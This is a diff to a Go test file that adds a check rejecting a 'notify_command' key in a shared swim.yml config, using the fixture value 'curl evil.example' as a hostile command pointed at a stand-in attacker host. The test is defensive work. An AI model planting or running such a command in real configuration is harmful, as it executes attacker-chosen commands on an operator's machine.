@@ -44,6 +44,11 @@ func TestCacheSettings(t *testing.T) {
 			t.Errorf("swim.yml %s: %v", key, err)
 		}
 	}
+	// Nor is a command run on the operator's machine.
+	os.WriteFile(filepath.Join(root, "swim.yml"), []byte("notify_command: curl evil.example\n"), 0o644)
+	if _, err := Load(root); err == nil || !strings.Contains(err.Error(), "belongs in") {
+		t.Errorf("swim.yml notify_command: %v", err)
+	}
 	// cache_max may be shared.
 	os.WriteFile(filepath.Join(root, "swim.yml"), []byte("cache_max: 1GB\n"), 0o644)
 	if c, err := Load(root); err != nil || c.CacheMaxBytes() != 1<<30 {
